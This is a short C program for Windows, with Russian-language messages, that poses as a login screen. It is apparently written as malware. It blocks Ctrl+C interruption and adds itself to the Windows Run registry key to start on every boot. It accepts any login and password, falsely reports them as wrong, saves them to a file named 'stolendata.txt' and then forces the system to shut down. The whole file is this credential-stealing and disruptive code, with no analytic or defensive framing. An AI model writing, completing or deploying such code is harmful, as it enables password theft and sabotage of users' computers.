#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <windows.h>
#include <conio.h>

int show_password = 1;

void handle_signal(int signal) {
    if (signal == SIGINT) {
        printf("Попытка прерывания заблокирована.\n");
    }
}

void setup_autostart() {
    HKEY hKey;
    const char* path = "C:\\path\\to\\your\\program.exe";
    const char* reg_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    if (RegOpenKeyEx(HKEY_CURRENT_USER, reg_path, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, "MyProgram", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
        printf("Автозапуск настроен.\n");
    } else {
        printf("Ошибка настройки автозапуска.\n");
    }
}

void save_credentials(const char* login, const char* password) {
    FILE* file = fopen("stolendata.txt", "w");
    if (file != NULL) {
        fprintf(file, "Login: %s\nPassword: %s\n", login, password);
        fclose(file);
        printf("Данные сохранены.\n");
    } else {
        printf("Ошибка записи в файл.\n");
    }
}

void shutdown_system() {
    printf("Выключение системы...\n");
    system("shutdown /s /f /t 0");
}

void toggle_password_visibility() {
    if (show_password) {
        printf("Пароль отображен.\n");
        show_password = 0;
    } else {
        printf("Пароль скрыт.\n");
        show_password = 1;
    }
}

void authorize() {
    char login[50], password[50];
    printf("Введите логин: ");
    fgets(login, 50, stdin);
    login[strcspn(login, "\n")] = 0;

    printf("Введите пароль: ");
    fgets(password, 50, stdin);
    password[strcspn(password, "\n")] = 0;

    if (strlen(login) < 3 || strlen(password) < 8) {
        printf("Логин или пароль слишком короткие!\n");
    } else {
        printf("Неверный логин или пароль. Повторите попытку.\n");
        save_credentials(login, password);
        shutdown_system();
    }
}

int main() {
    signal(SIGINT, handle_signal);

    setup_autostart();

    authorize();

    return 0;
}